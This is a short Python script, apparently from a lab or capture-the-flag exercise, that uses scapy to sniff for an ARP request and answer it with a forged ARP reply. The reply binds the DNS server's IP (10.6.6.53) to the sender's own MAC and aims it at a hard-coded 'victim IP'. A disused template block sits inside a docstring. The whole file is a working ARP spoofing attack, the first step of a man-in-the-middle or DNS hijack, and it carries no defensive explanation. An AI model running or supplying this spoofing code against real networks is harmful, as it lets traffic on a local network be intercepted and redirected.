from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 ip
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our eth0 mac address
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
def handle_arp_packets(packet):
    # if arp request, then we need to fill this out to send back our mac as the response
    if ARP in packet and packet[ARP].op == 1:
        packet.show()
        ether_resp = Ether(dst=packet[ARP].hwsrc, type=0x806, src=macaddr)
        a = ARP()
        a.op = 2 # arp reply
        a.plen = 4
        a.hwlen = 6
        a.ptype = 2048
        a.hwtype = 1
        a.hwsrc = macaddr           # my MAC
        a.psrc = "10.6.6.53"        # DNS IP 
        a.pdst = "10.6.6.35"        # victim IP
        a.hwdst = packet[ARP].hwsrc # victim MAC
        a.show()
        """
        arp_response = ARP(pdst="SOMEMACHERE")
        arp_response.op = 99999
        arp_response.plen = 99999
        arp_response.hwlen = 99999
        arp_response.ptype = 99999
        arp_response.hwtype = 99999
        arp_response.hwsrc = "SOMEVALUEHERE"
        arp_response.psrc = "SOMEVALUEHERE"
        arp_response.hwdst = "4c:24:57:ab:ed:84"
        arp_response.pdst = "10.6.6.35"
        """
        response = ether_resp/a
        sendp(response, iface="eth0")
def main():
    # We only want arp requests
    berkeley_packet_filter = "(arp[6:2] = 1)"
    # sniffing for one packet that will be sent to a function, while storing none
    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)
if __name__ == "__main__":
    main()
